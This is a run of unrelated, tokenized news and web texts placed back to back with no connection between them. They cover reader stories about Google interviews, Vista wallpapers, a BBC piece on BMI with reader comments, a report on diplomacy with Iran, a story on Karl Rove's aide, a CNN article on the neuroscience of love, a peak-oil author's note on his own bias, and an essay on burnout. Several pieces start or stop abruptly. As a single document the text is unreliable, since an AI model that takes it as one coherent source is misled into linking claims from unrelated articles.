Chevigny said he was hopeful their case would prevail , although he noted glumly that U.S. Supreme Court had ruled that performance dance -- but not social dance -- is a protected form of expression .
“ The irony , ” Chevigny said , “ is that strippers are protected by the 1st Amendment and waltzers are not . ”

We 've heard quite a few anecdotes of bizarre interview practices from Google over the years , so when we asked if you had some of your own , you did n't disappoint .
The company that turned down Bram Cohen , creator of Bittorrent , but managed to find a post for crazed neo-con headbanger Dan Senor , certainly moves in mysterious ways .
So when we heard that Google is using a robot to aid with the recruitment process , we solicited some of your tales .
Here they are , with names removed , for obvious reasons ...
On a phone interview six or seven years ago for Google -
I have a PhD - level resume and a string of major innovations and discoveries to my credit -- the interviewer asked questions like , " What is the C - language command for opening a connection with a foreign host over the internet ? "
My ( wrong ) answer : " Look it up in the back of the book . "
Apparently they not only want you to be able to program , but to have memorized all the function syntax .
A more recent interview there for a product - manager position was very intense : one 45 - minute session after another , with the interviewer firing off rapid - fire questions like " How would you boost the GMail subscription base ? " , " What is the most efficient way to sort a million integers ? " , " How would you re-position Google 's offerings to counteract competitive threats from Microsoft ? "
But the interviewers did n't actually look at me as I answered , since they were busy tapping nonstop notes onto laptops .
The whole vibe was eerily like I felt when interviewing on Wall Street years before : arrogance personified , with the brusqueness coming from certain knowledge that they are the Masters of the Universe and you are very lucky to even be in their presence .
So for sanity 's sake , it 's probably just as well I did n't get the job(s ) , although I 'd be much richer now if I had .
My background - 10 + years of technical work in " X " , and management experience , at Fortune 50 and Fortune 100 companies .
No brand name school degree though .
It was pretty interesting .
I sent in my resume to a job I really like , a manager position ( of X ) .
It 's what I 've been doing for quite a few years now .
Did n't hear anything back .
I know someone who works there though , and talked with him .
He suggested manager of Y as well as X .
I talked to manager of Y , and he liked me and thought I had good technical skills , but did not have enough management experience for large groups ( 50 + ) .
Fair enough .
Largest group I 've directly managed is about 12 , and I 've worked across multigroup projects of 20 +.
I do n't think managing more people is really that big an issue , but ... that 's not my call .
I then got through to the recruiters about X because of my friend 's recommendation .
So I started on about 4 - 5 rounds of technical interviews , ending with an interview with manager of X .
Got through all the technical interviews .
Invited to go onsite .
Went onsite , and had another 5 rounds of more management type interview , but had one technical interview .
The technical guys really drilled down on what I know , and I had a brain lockup that day .
Could n't do anything technical at all , could not explain how ssh works , could not explain how diffie - helman works , do n't even know how cross site scripting works .
A couple of weeks back , I was told , no go .
Apparently in the other 4 onsite interviews they really liked my management style , but I got kicked out for not being technical enough .
I was at lunch when that happened , and I announced to the folks there .
They looked at me with big eyes - I 'm probably the most technical person in the group ;
Even my ex-boss , and a reference , thought Google was crazy :)
So , there you have it .
Team Y thought I had good technical skills , but not enough management skills , and Team X thought I had good management skills and not enough technical skills .
I 'm just surprised that the ONE onsite tech interview where my brain locked up counted so much - apparently running the 4 - 5 months of technical interview gauntlet did n't indicate that I had technical skills .
Google might also want to consider the fact that sometimes , the technical guy doing the interview is asking questions that HE knows about , and the interviewee may be very technical , but just not in the exactly questions being asked ( aside : I do know how Diffie helman and x - site scripting works .
When I need to know exactly how it works , ie , when i'm investigating an issue / protocol / something , I 'll go read up on the exact mechanism , but in general , I do not keep the Diffie Helman protocol in my head - encrpytion stuff is NOT my dayjob ) .
Am I still interested in working for google ?
Sure .
Would I be interested in going through another 4 - 6 months of Google - interview - roulette ?
No .
First .
You are correctly noting the ominous " organizational citizenship " .
That is absolutely correct .
While Google likes to draw itself as a " revolutionary " in terms of organisation , job conditions , etc - their hiring practicies and internal organisation are conventional and frozen in the past in a manner which closely resembles a civil service at its worst .
Their network engineering is strictly separated from software , systems , operations and business .
A person is not ever allowed to straddle the sacred boundaries and if a person has skills that span the sacred boundaries they end up being the ball in an interdepartamental HR volleyball match ( you have this one , no you have it , etc ) .
Even traditionally rigid places like banks , telcos and service organisations have recently seen the light and allow people to straddle boundaries between network , software and systems provided that they have the skills , because this vastly improves turnaround on projects and reduces project deployment times .
From this perspective Google beta pathology is no longer surprising .
Second .
Their hiring process is clearly disfunctional .
They agree to interview a person who is interested only in a chosen location and has no interest in working anywhere else .
So for example , you have agreed to go ahead with the interview only if you can work in their Denver office .
They schedule an interview with you and you pass the interview after which you are contacted by a HR droid who says " I am contacting you about this job in Mountain View for which you have applied , we would like to take the process further " .
At which point you tell them to go stuff the Mountain View somewhere where sun does not shine as you are only interested in Denver .
At that point they reschedule a new interview agreeing that Denver is OK as a possibility .
Interview passes , the next HR droid contacts you again with " I am contacting you about this job in Mountain View for which you have applied , we would like to take the process further " .
Rinse , repeat .
No wander they need bots to filter applications .
Third .
They have a process which intentionally filters out people who are single minded and focused on a goal in favour of people who like to spread around and tinker with things .
At some point in the process you end up in a room with gadgets and things .
The room actually has either a CCTV camera or a double mirror ( no idea what is the actual technical implementation ) .
If you open your bag and read a book so that you do not lose concentraion at that point and ignore the shiny gadgets you are most likely going to fail the interview .
If you tinker with the shiny trinkets around you , the likelihood that you will pass will vastly improve .
Once again - no wander the pathological beta .
Rinse , repeat
Several years ago I put my resume in as I thought it would be an interesting place to work .
Got a call for a telephone interview .
The call came in 90 minutes late and lasted 15 minutes .
Ca n't say I was surprised that I never heard back from them .
The interview may have had two brain cells but I 'm not too sure .
I had to correct the questions he was asking .
Either he had no idea or the paper he was reading from had some very badly worded questions .
If you have n’t already , check out my interview with the Flickr man himself , Hamad Darwish .
Desktop wallpapers usually meant one of three things : exotic cars , women in compromising positions , or Bliss .
If you were given the job to choose only a handful of images from billions and billions of creatives available today to be part of an operating system ’s desktop wallpapers , how would you choose them and which ones would you choose ?
That was the daunting task appointed to Microsoft Design ‘s Jenny Lam , who led the year - long search to find what would become the new set of bundled wallpapers for Windows Vista .
The end result is a stunning set of photographs and art which make up the collections of light auras , textures , paintings and vistas .
You might be easily fooled to believe that these are the works of professional photographers who eat camera film for breakfast , lunch and tea , but you ’d be wrong .
It ’s true , some of these photos did come from big stock houses such as Corbis , Getty and National Geographic , but did you also know some came from Flickr and even Microsoft employees ?
Photographs by Flickr user
Photographs by Flickr user Hamad Darwish
Some interesting statistics on the selection process :
About 2/3rds of the collection is licensed from stock houses .
There are a handful from amateur Flickr photographers ( which are Jenny ’s favorites ) .
Not only did Jenny ask the Flickr photographers if they could license their images , she also sent them on a commissioned photoshoot .
You can find some here and here .
About 5 images came from Microsoft full - time employees .
Several that were work for hire , where Jenny art - directed a professional photographer on a shoot in Santa Barbara and NYC .
Evaluated over 10,000 images with over 50GBs of low - resolution images during the round 1 selection process .
This new approach to sourcing and licensing creatives is exciting not only because amateur and enthusiast now have the chance to showcase their works to millions and millions of people – something even the most prestigious art gallery cannot offer , but also recognition of community - driven websites such as Flickr for the ability to deliver quality ‘ products ’ equal to or even better than from traditional content companies .
Hopefully Microsoft might even consider expanding the program to allow for public submissions of photographs and creatives to be included in future editions of Windows .
In a way , “ Show us your Wow ” is already a test - bed for user - submitted content and community feedback with over 20,000 entires submitted .
Of course , there will be certain licensing and legal issues to overcome , but I bet some enthusiasts will do anything to get their works displayed on such a scale .
Certainly interesting times ahead for enthusiasts like Hamad and Thomas Hawk .

Four of these men are obese - but did n't know it , until we stepped in
By Denise Winterman
BBC News Magazine
How hard can it really be ?
The rolls of surplus flesh , the tight waistband , not being able to see your own feet - you do n't need to be a rocket scientist to work out you 're carrying extra pounds .
But many people do n't consider themselves overweight , according to fitness minister Caroline Flint , who says it 's one reason why nearly a quarter of adults in the UK are obese .
OVERWEIGHT ACCORDING TO BMI George Clooney Brad Pitt Matt Damon
Calculate your BMI
The government and doctors use the body mass index ( BMI ) to assess a person 's condition ; classing us as " underweight , ok , overweight , obese or clinically obese " .
The calculation is based on comparing a person 's weight with their height and does not take into account sex or the proportion of body fat to muscle .
Some medical bodies , including the World Health Organization , say waist size is a more accurate measure , but the government has no plans to ditch the BMI .
" We are aware of criticism and that there has been talk of the hip - to - waist ratio , but this is the agreed system and we will continue to use it , " says a Department of Health spokeswoman .
So what does obesity look like ?
The Magazine headed to Stratford , east London , to break the unhappy news to some unsuspecting men , who significantly outnumber women in the fight against fat .
ZAC GOBI - 6FT 4INS - 18 STONE - OFFICIALLY OBESE
" Obese !
Not even just overweight .
That is a bit of a shock .
I think it 's ridiculous , I 'm 6ft 4ins so I 'm never going to be as light as a feather .
I think my weight is fine for my height .
" To get to the weight slap in the middle of what the index says is right for a man of my height I would have to lose around five stone .
That 's madness , I 'd look ill and as if I had a massive head .
" I eat one big meal a day , it is a really big meal - maybe a whole chicken , rice and peas .
I think the amount I eat and my diet is good .
There is a problem with weight in this country but the index is confusing .
It does n't take into account things like muscle . "
BILLY MURRELL - 5FT 8INS - 14 STONE - OFFICIALLY OBESE
" No way .
I do n't agree with that - it 's crazy .
I know I 'm carrying a few extra pounds and I am having a cheeseburger for breakfast , but obese ?
I 'm just eating this to kill a bit of time before an appointment , I do n't usually have a burger for breakfast .
" That classification is n't any good because it does n't take into account my body frame , muscle or what sex I am , all of which make a difference .
" I 'd have to lose around three stone for the government to think I 'm the right weight , That 's just stupid .
I 'd look ill and I probably would be ill .
" I know the government has to have a way to measure weight , but this is not it .
They need to look at things again . "
ANDY WOOD - 6FT 2INS - 16ST 11LBS - OFFICIALLY OBESE
" I know I 'm carrying a little bit of extra weight but I 'm not obese .
I think I am a fair weight for my height and build .
" The BMI does n't take into account things like muscle , which is important .
It would class most rugby players and footballers as obese and look how fit they are .
" According to the index my healthy weight is around 12 to 13 stone , but I actually think that is underweight for my height .
" There is a problem with obesity in this country , people do n't eat well or look after themselves .
But using the BMI is not the right way of assessing the problem , it 's not very helpful . "
BRIAN MANSFIELD - 5FT 11INS - 17 STONE - OFFICIALLY OBESE
" I knew it would have me as obese .
I know I am packing a few extra pounds , but I do n't consider myself obese .
" I 'm big boned but the index does n't take that into account and it should .
I do drive a cab , which means I 'm sitting on my bum all day but I would n't say I was unhealthy .
" I have lost weight in recent months .
I did it by eating healthily , my wife does all that stuff - salads and that .
She looks after me very well .
" The BMI is not a helpful way of calculating who 's overweight and not .
The problem is if people do n't trust it they 're not going to trust what else the government says about being healthy . "
LEE EMBERY - 6FT 2INS - 15 STONE - OFFICIALLY OVERWEIGHT
" I think that 's a bit harsh .
I know I could do with losing some weight , but only a few pounds .
" I 'd have to lose about two stone to get to what the government thinks is the ideal weight for me .
It 's ridiculous , I would look ill , look like a skeleton .
I would not look healthy .
" I know there are some things about my eating habits that I could change but on the whole I do n't consider myself unhealthy .
" I 'd like to see what some of those government ministers are classed as using this index .
I would like to see how they react to being called fat . "
I 'm a male 5 ' 8 " and 12Stone .
If I was built like George Cluney then the BMI would n't fit me but then I would n't have a double chin or love handles so I guess that I need to loose some weight .
The problem is that because so many people are overweight being a bit chunky has become the norm and does n't look out of place .
However the fact of the matter is , if you are overweight then you increase your chances of dying before you should .
So be fat or not but do n't criticise the government for giving a simple guide to help you .
Paul , Glasgow
Current thinking is that a person 's waist measurement is a more accurate way of seeing if they are obese .
Many athletes , i.e. weight lifters , shot putters , etc. are very large but it is all muscle and would show as obese if bmi was used .
JILL BOND
I look at these pictures and see men that , mostly , look reasonably healthy .
Maybe Britain 's problem is not obesity but the BMI index .
Its just another nanny state scare story .
Mike Ayres , Bodmin , UK
I challenge all members of parliament to have their weight checked against the BMI index and see how many of them come out overweight and obese .
maureen hodgson , telford shropshire UK
I 'm sorry but I think many people in Britain are deluded about their weight .
It is easy to disguise several stone of excess flesh by dressing carefully .
However , the internal threat to our systems is there none the less .
Stay fat if you like but be prepared to suffer the consequences of your denial !!
Healthy eating is just a good habit we need to practise .
Unhealthy eating is just a bad habit we need to give up .
Not rocket science .
OmegaSarah , Huntingodn
These five men are in denial about their size .
Of the four men you can see none of them look healthy , they are just hiding their bodies in lose fitting clothes .
They all look overweight to me and could do with losing more than their suggested few pounds .
Lee Embery sums up public perception of weight when he says " I 'd have to lose two stone ... I would look ill , look like a skeleton " .
People do n't see being overweight as looking ill they see being lean as ill .
Even though the people with BMI index in the lower half of the ideal weight section have the least health problems .
Andrew Campbell , Southport , UK
Maybe the BMI takes it 's baseline from the skeletal celebrities / models rather than real people ?
Not to take muscle into account is ridiculous as it weighs so much more than fat .
Sue , Cheshire
ig Boned ?
Given that your skeleton accounts for just 15 % of your body weight it 's clear that even if you had bones half as big again as the next person this is n't going to have much effect on your overall weight .
Lay off the pies , and you 'll end up with the correct BMI ; people are just kidding themselves .
Ewan , Newcastle Upon Tyne
What a horrible world it would be if everyone conformed to this meaningless measure , and we all pottered about half starved , in our joyless feable frames .
Thank god we still have the right to live our lives the way we want to , for now .
Steve , Colchester
According to the BMI Jonny Wilkinson is overweight and the likes of Lawrence Dallaglio are obese .
Need I say more ?
Steve Ferris , Gloucester
I have to say I agree with these blokes - they all look fine to me !
I am in the ok weight - range on the chart , but then I am female so probably have less muscle than these guys , who all look ok to me .
As they say , maybe a couple of them could do with losing a few pounds , but I certainly would n't class these people as obese ... or even overweight in most cases !
Very interesting - I thought BMI was a good way of measuring if someone was overweight or not , but now I 'm not so convinced .
Rebecca , birmingham
Its crazy madness i tell you , none of those men look obese !!
The chap who uses the example of rugby players is spot on , muscle weighs a lot more than fat .
I went ona diet , exercised , changed shape and went down two dress sizes , but for the first few months i put weight on , as i was building muscle .
I was told by a qualified fitness instructor NOT to weigh myself as it is misleading !!
Utter rubbish this BMI scale , but unfortunatly it needs to be measured , just in a more realistic way .
Suz , Gloucestershire
I am a weight lifter and runner .
I ran the Nike Run London 10 km in 54 minutes and today I benched 120 kg in the gym .
At 6 ' 1 " and 105 kg I am obese according to the BMI .
Philip Duran , London
I 'm 18 years old , and have lost 5 and 1 / 2 stone in just over a year .
My BMI states that I am right in the middle , if not towards the top end of the right weight for me ( being 5ft 8 inches , weighing 1o stone 5 pounds ) yet some people in my family have recommended that I need to put on 1/2 a stone to be at the right weight .
I think that all the BMI can be used for is a vague benchmark for people , and is unreliable , and inaccurate .
Richard Durkin , Sheffield
Well , I 'm 6 ' 4 " and approx 85 kgs so with a BMI of about 22.5 .
Recently I weighed about 10 kgs more than that , realised I was getting podgy and lost the weight .
It 's really not that hard , you 've just got to stop deluding yourself that you 're healthy .
Theres a hude difference between International Rugby players and us common mortals .
Duncan , Cambridge
I 'm 5 ' 7 " , about 14st , broad - shouldered and stocky .
The charts say I 'm around 3.5st too heavy , and class me as obese .
The charts lie .
I had a medical a while ago ( I weighed more then ) that measured my actual body fat percentage .
They calculated my ideal weight range to be only 1 - 2st less than my current .
BMI is a fiction that succeeds only in setting unachievable targets , and making healthy people feel insecure in themselves .

The report 's authors want Tony Blair to put pressure on the US
Blair on Middle East
The organisations are urging the prime minister to put pressure on the US to enter talks with Tehran .
The US has refused to rule out military action if Iran does not halt its nuclear activities .
Former Labour MP Lorna Fitzsimons warned that time was " running out " to stop Iran becoming nuclear - armed .
Criticism
The US and its Western allies suspect Iran of using its nuclear energy programme as a cover to produce atomic weapons .
Tehran denies this claim .
Recent criticism by President George Bush of alleged Iranian support for insurgency in Iraq has increased concerns that his administration is contemplating an attack .
The consequences of military action against Iran are not only unpalatable , they are unthinkable
Former Labour minister Stephen Twigg
Analysis : Worries over Iran
In the report , Time to Talk : The Case for Diplomatic Solutions on Iran , the coalition accuses Mr Blair of using the prospect of military action as a negotiating tool .
Launching the report , former Labour minister Stephen Twigg , director of the Foreign Policy Centre , said : " The consequences of military action against Iran are not only unpalatable ; they are unthinkable .
" Even according to the worst estimates , Iran is still years away from having a nuclear weapon .
" There is still time to talk and the prime minister must make sure our allies use it . "
Coalition
The charity Oxfam , unions Unison , GMB and Amicus , have been joined by the Muslim Parliament and Christian Solidarity Worldwide in signing the report .
HAVE YOUR SAY Iranians like America , However , that can change overnight if the US attacks Iran
David , Minneapolis / Tehran
Send us your comments
" Military action is not likely to be a short , sharp engagement but could have a profound effect on the region , with shock waves felt far beyond , " the report says .
It goes on to say the British government is " well positioned to articulate objections to military action " and that it should " not lose this opportunity to advocate for direct US engagement " .
But Ms Fitzsimons , chief executive of the Britain - Israel Communications and Research Centre , told BBC Radio 4's Today programme : " What we are talking about here is Iran reaching the ability on an industrial scale to manufacture highly enriched uranium . "
' Watershed '
International Institute for Strategic Studies and others were predicting this would happen within 11 months , she added .
Ms Fitzsimons said : " That is the watershed .
There is no return from that point .
" You ca n't get the genie back in the bottle technologically once they have sorted out the problem they currently have with their centrifuges .
" I do n't think you can stop it .
You might be able to disrupt it .
It 's a question of looking at how far you can go down the line where you lose the ability to disrupt it . "
Sir Richard Dalton , the British ambassador to Iran until last year , backed the calls for increased diplomacy .
" Recourse to military action - other than in legitimate self - defence - is not only unlikely to work but would be a disaster for Iran , the region and quite possibly the world , " he said .
Military warnings
Liberal Democrat foreign affairs spokesman Michael Moore said : " This is a timely and significant report .
" It highlights the need for the international community to be more aware of the potentially disastrous consequences of military action against Iran . "
But the Conservatives said it was important to " keep all options on the table " .
Shadow defence secretary Liam Fox said : " We cannot give them the comfort of believing that there is any weakness in the western alliance or that there is a chance that they might be able to divide and rule . "

Top Rove aide , implicated in Attorneys firings , clears out office Michael Roston
Published : Monday May 28 , 2007 Print This Email This Update :
This article has been updated to reflect that a subpoena was authorized for Ms. Taylor , which the Senate Judiciary Committee had not previously announced .
A top aide to White House political adviser Karl Rove has ' cleared out her office , ' according to a report in Monday 's Washington Post .
Sara Taylor , Rove 's top lieutenant , has seen her name brought up in recent months in Congressional hearings relating to the firing of 8 US Attorneys .
" Taylor , 32 , was one of the first people put on the payroll of the Bush campaign , " writes Michael Fletcher in the new ' At the White House ' column .
" Taylor cleared out her office early last week .
She plans to take her skills to the private sector . "
Taylor is described by Fletcher as skilled in ' microtargeting , ' the practice of identifying voting constituencies at their most elemental levels .
She has also come up as a potential target for a subpoena from the House and Senate Judiciary Committees , as RAW STORY has earlier reported .
The White House political strategist was first identified as playing a role in the removal of US Attorney for the Eastern District of Arkansas H.E. ' Bud ' Cummins during the Senate Judiciary Committee hearing with D. Kyle Sampson , the former Chief of Staff to Attorney General Alberto Gonzales .
Taylor was also identified by Monica Goodling , Gonzales 's former White House Liaison .
After Rep. Sheila Jackson - Lee ( D - TX ) asked Goodling what Karl Rove knew about the firing of the US Attorneys , she suggested Taylor had signed off on the plan .
" There was an e-mail that Mr. Sampson forwarded to me , I think , on December 4 , if I 'm remembering correctly , that said that it had been circulated to different offices within the White House and that they had all signed off , " Goodling answered .
" I think it said that White House political had signed off .
Political is actually headed by Sara Taylor but does report to Mr. Rove , so I do n't know for sure . "
In April , Taylor was threatened with the possibility of facing a subpoena .
" The Committee is expected to vote on [ the authorization of a subpoena ] next week for Sara M. Taylor , Deputy Assistant to the President and Director of Political Affairs , " read an April 12 press release from Senator Patrick leahy ( D - VT ) , the chairman of the Senate Judiciary Committee .
A Senate Judiciary Committee spokesperson told RAW STORY that a subpoena was authorized for Taylor on April 25 .
Additionally , the committee had earlier authorized a subpoena for her assistant , J. Scott Jennings .
While subpoenas have been authorized , White House officials have not yet been compelled to testify .
White House Counsel Fred Fielding continues to maintain that their statements cannot be taken on the record because the content of any testimony would be privileged communications .
Congressional investigators have in turn threatened to issue subpoenas as the White House has dug in its heels .
" If the White House persists in refusing to provide information to the House Judiciary Committee , or even to discuss providing such information , on a voluntary basis , we will have no alternative but to begin to resort to the compulsory process in order to carry out our oversight responsibilities , " said Rep. John Conyers ( D - MI ) and Rep. Linda Sanchez ( D - CA ) in a May 21 letter to Fielding .

Story Highlights • MRI scans show activity in caudate area of the brain at the sight of one 's beloved
• When you 're in love , caudate area flooded with dopamine , a pleasure chemical
• Researcher : " Exactly the same system becomes active as when you take cocaine "

( CNN ) --
Close your eyes for a minute and envision all the romantic parts of the human body .
Her beautiful eyes .
His strong shoulders .
We 'll stop there , but you go right ahead and think about all the body parts you want .
Bet you did n't think about the caudate and the ventral tegmental areas , did you ?
These areas of the brain , while little known to most people , are helping scientists explain the physiological reasons behind why we feel what we feel when we fall in love .
By studying MRI brain scans of people newly in love , scientists are learning a lot about the science of love :
Why love is so powerful , and why being rejected is so horribly painful .
In a group of experiments , Dr. Lucy Brown , a professor in the department of neurology and neuroscience at the Albert Einstein College of Medicine in New York , and her colleagues did MRI brain scans on college students who were in the throes of new love .
While being scanned , the students looked at a photo of their beloved .
The scientists found that the caudate area of the brain -- which is involved in cravings -- became very active .
Another area that lit up : the ventral tegmental , which produces dopamine , a powerful neurotransmitter that affects pleasure and motivation .
Dr. Brown said scientists believe that when you fall in love , the ventral tegmental floods the caudate with dopamine .
The caudate then sends signals for more dopamine .
" The more dopamine you get , the more of a high you feel , " Dr. Brown says .
Or as her colleague , Dr. Helen Fisher put it :
When you fall in love , " exactly the same system becomes active as when you take cocaine .
You can feel intense elation when you 're in love .
You can feel intense elation when you 're high on cocaine . "
Is it love -- or sex ?
Scientists then wondered :
Does a brain in love look much like a sexually stimulated brain ?
After all , we associate love and sex and sometimes confuse them .
The answer is : Brains in love and brains in lust do n't look too much alike .
In studies when researchers showed erotic photos to people as they underwent brain scans , they found activity in the hypothalamus and amygdala areas of the brain .
The hypothalamus controls drives like hunger and thirst and the amygdala handles arousal , among other things .
In the studies of people in love , " we did n't find activity in either , " according to Dr. Fisher , an anthropologist and author of " Why We Love -- the Nature and Chemistry of Romantic Love . "
" We now have physiological data that suggests there are different brain systems for sex and love , " says Dr. Fisher .
At some point , the two do become linked .
People in love have elevated levels of dopamine .
Lots of dopamine , in turn , triggers the production of testosterone , which is responsible for the sex drive in both men and women .
This helps explain why falling in love can make someone all of a sudden seem sexy .
" Three weeks ago he was just another nice guy in the office and now everything about him is sexual , " says Dr. Fisher .
All this research into sex and love got the researchers thinking :
Most other mammals do n't have this drive for romantic love and attachment .
Why do humans have it ?
After all , we could easily propagate the species just with our sexual urges .
Dr. Fisher thinks it has a lot to do with how difficult it once was to raise children .
" Go back millions of years to the grasslands of Africa .
A woman was carrying the equivalent of a 20 - pound bowling ball in one arm , and sticks and rocks in another arm to protect herself in this dangerous environment .
She needed a partner to help her .
She could n't do it alone , " Dr. Fisher says .
And even today , when we have strollers and the environment is n't quite as dangerous , having a mate still helps .
" There are women who raise a baby by themselves , but it 's a lot harder , " she says .
Male brain - female brain
In their work with the lovestruck , the scientists found brain differences between men and women .
" The men had quite a bit more activity in the brain region that integrates visual stimuli .
This is n't surprising considering that men support the porn industry and women spend their lives trying to look good for men , " says Dr. Fisher .
But she adds there 's probably a more anthropological reason at work .
Simply put : A man 's evolutionary mission is to spread his seed .
That wo n't work if he mates with an 80 - year - old grandmother .
" Men have to be able to size up a woman visually to see if she can bear babies , " says Dr. Fisher .
The women 's brain activities were a bit more puzzling .
The scientists found that women in love had more activity than men in the areas of the brain that govern memories .
Dr. Fisher theorizes that this is a " female mechanism for mate choice . "
There are no visual clues for whether a man is fertile , but if a woman really studies a man and remembers things about his behavior , she can try to determine whether he'd make a reliable mate and father .
Thus , if it sometimes seems like a woman remembers everything -- good and bad -- about a man , " it 's not just her being picky .
It 's an old Darwinian evolutionary strategy . "
What 's love got to do with it ?
In the end , Drs. Fisher and Brown say what they learned from lovers ' brains is that romantic love is n't really an emotion -- it 's a drive that 's based deep within our brains , right alongside our urges to find food and water .
" This helps explain why we do crazy things for love , " says Dr. Brown .
" Why did Edward VIII give up the throne for Wallis Simpson ?
The systems that are built into us to find food and water are the things that were also active when he renounced the throne of England . "
Now their research is centered on the flip side of love .
They 've recruited college students who'd just been rejected by their sweethearts .
Again , the scientists performed MRI 's while these students looked at photos of the objects of their affection .
This time , the results were different , Dr. Brown says .
The insular cortex , the part of the brain that experiences physical pain , became very active .
" People came out of the machine crying , " she said .
" We wo n't be doing that experiment again for a long time . "

Personal note about bias :
When this page started , in 1996 , it really was mostly " interesting oil statistics " - largest fields and so on .
It has evolved , as my personal interests and those of the page 's viewers have evolved , to be a hodgepodge of information about a lot of complex things .
I have tried VERY HARD to make this page be objective and free of bias - but it is done by a human being , and it is impossible to remove all my bias , even though as a scientist ( geologist ) I try to do that .
By way of background , in the late 1990s I really thought the " peak oil " people were crazy , or at least " doomsayers " and pessimists .
Oil exploration people ( like me ) tend to be optimistic - you have to be , since you fail so often .
But in the past 5 to 7 years , I 've come to feel , largely through creating this compilation , that the " peak oil " people are a lot closer to right than are the " sweetness-and- light-and - nothing - is- really - wrong " crowd .
I do n't KNOW that - but based on what I can see and read with my own eyes , there is little question that Americans ' oil guzzling will bring us to a fall , likely sooner rather than later .
So , there , now you know my bias .
Read this page with that in mind - but please also know that I still am trying very hard to keep it as objective as possible .

Micromanaging
People who are suffering from burnout tend to describe the sensation in metaphors of emptiness — they ’re a dry teapot over a high flame , a drained battery that can no longer hold its charge .
Thirteen years , three books , and dozens of papers into his profession , Barry Farber , a professor at Columbia Teachers College and trained psychotherapist , realized he was feeling this way .
Unfortunately , he was well acquainted with the symptoms .
He was a burnout researcher himself .
Being burned out on burnout — now that was rich .
Madame Curie died of radiation poisoning ; Joseph Mitchell famously developed a 32 - year - long case of writer ’s block after writing a two - part New Yorker series about a blocked writer ; now Farber was suffering the same self - referential fate .
He jokes about it today ( who would n’t ? ) but hardly felt sanguine as it was happening ( who would ? ) .
Colleagues tried to persuade him to stick it out .
“ But for the most part , I ’ve resisted coming back , ” says Farber .
“ I ’ve never been able to find that same sense of satisfaction . ”
Farber had burned out once before .
Back in the late sixties and early seventies , he taught public school in East Harlem .
He ’d wanted to help people , do the world some good .
Yet for four years he ’d struggled to stop his students from fighting with one another , and in spite of his best efforts he could n’t even teach all of them to read .
His classroom became a perverse experiment in physics , with energy never conserved ( input always exceeded output ) , and he , a teacher in perpetual motion , always craving rest .
Eventually , he began to pull away from his students — depersonalization , as the literature now calls it — justifying his seeming insensitivity by telling himself he was n’t making a difference anyway .
It was only when Farber went to graduate school at Yale that he learned that this syndrome had a name : Burnout .
“ The concept offered a perfect understanding of what teachers were feeling , ” he recalls .
“ It was n’t in fact that they were racist and mercenary and noncaring but that their level of caring could n’t be sustained in the absence of results . ”
Farber was so captivated by the notion of burnout he made it the subject of his dissertation .
And he stayed with it for another thirteen years .
Until the day he could n’t anymore .
He still remembers the breaking point .
He ’d just completed a book about burnout among teachers , a subject he ’d once considered exceptionally urgent .
“ Yet even as I was writing , ” he says , “ I had this sense that I really wanted to finish it so that I could go on to something else .
I felt somewhat bored , and somewhat depleted .
I ’d said all I wanted to say . ”
He ponders this point .
“ I guess , ” he says , “ I lost the sense that it was important . ”
I can’t quite say that I ’ve ever had the full - on Farber experience .
But I ’ve certainly had mini-versions of it .
Whenever I ’ve finished a big project , for instance , or whenever I ’ve found myself listening to the 10 p.m. whir of the vacuum cleaners in our office start up for the tenth night in a row , there ’s no one I identify with more than the Bill Murray character in Rushmore , particularly as he ’s blankly tossing golf balls from a wire basket into his swimming pool .
It ’s not that I do n’t love my work .
But hold a stethoscope to my brain , eavesdrop on my innermost thoughts , and at those moments , all you ’ll hear is the sound of a whistling conch shell .
Burnout is not its own category in the Diagnostic and Statistical Manual of Mental Disorders .
It ’s not something that can be treated pharmacologically ; it is not considered the same thing as depression or a midlife crisis , though sometimes they coincide .
The term was first coined by a psychotherapist named Herbert Freudenberger , who himself probably took it from Graham Greene ’s novel A Burnt - Out Case .
( “ I have n’t enough feeling left for human beings , ” the book ’s numb protagonist , Querry , wrote in his journal , “ to do anything for them out of pity . ” )
While working at a free clinic for drug addicts in Haight - Ashbury , Freudenberger noticed that the volunteers , when discouraged , would often push harder and harder at their jobs , only to feel as if they were achieving less and less .
The result , in 1974 , was the book Burnout : The High Cost of High Achievement .
Others soon followed .
A subspecialty of psychology was born .
Back in the seventies , when people marched into the world with convictions about changing it , burnout was considered a noble affliction .
It meant that you ’d depleted yourself while helping others .
Almost all the research that ’d been done on the subject , and there ’d been quite a lot , was on the people in the “ caring professions ” — nurses , public - school teachers , legal - aid workers , social workers , clergy .
Because many of these people were idealists , and because they worked with the hardest - luck cases , they were highly susceptible to disillusionment .
Those who burned out were not only physically and mentally exhausted ; they were cynical , detached , convinced their efforts were worthless .
They held themselves in contempt .
Worse , they held their clients in contempt .
They began to loathe the same people they originally sought to help .
In her seminal book Burnout : The Cost of Caring , Christina Maslach , perhaps the best - known burnout researcher working in the United States today , collected plenty of vivid , unvarnished testimony .
As one Florida social worker told her , “ I recently received a call at night , and while I was getting dressed , I was screaming and cursing these motherfuckers for calling me with their goddamned problems . ”
Today , in New York City , everyone knows that the ones “ screaming and cursing these motherfuckers for calling me with their goddamned problems ” are as likely to be hedge - fund managers as any species of do - gooders .
Burnout is the illness of just about any averagely driven , obsessive New York professional .
Bankers , high - tech workers , advertisers , management consultants , lawyers working in their mustard - lit honeycombed Hades — all of them are as likely to complain about burnout as schoolteachers and social workers .
In 21st - century New York , the 60 - hour week is considered normal .
In some professions , it ’s a status symbol .
But burnout , for the most part , is considered a sign of weakness , a career killer .
“ My clients are perfectionists , ” says Alden Cass , a therapist to both corporate attorneys and men on Wall Street .
He ’s young , about the age of a hungry broker , and he looks like the men he treats — strong features , dark teased hair , Turnbull & Asser striped shirt , nice watch .
“ They have very rigid ideals in terms of win-lose , ” he continues .
“ Their expectations of success are through the roof , and when their reality does n’t match up with their expectations , it leads to burnout — they leave no room for error or failure at all in their formula . ”
Cass is the opposite of a rumpled therapist or academic who might have studied burnout in the seventies .
He ’s today ’s version , a $ 350 - an - hour executive coach , someone who accommodates busy schedules by meeting over lunch or at baseball games and speaks in the idiom of Wall Street .
His clients , too , are the inside - out version of the burned - out altruists people were examining in the seventies :
Unblushingly ambitious , rich , focused as Marines .
Yet ask Cass why his clients are burning out , and his answer is n’t any different for a banker than it would be for a public - school teacher ; there ’s a gulf between what they expected from their jobs and what they got .
“ I ca n’t tell you , ” he says , “ how many people come into my office and ask , ‘ How come I have this money and I ca n’t find happiness ? ’ ”
So what does he tell them ?
“ That happiness equals reality divided by expectations . ”
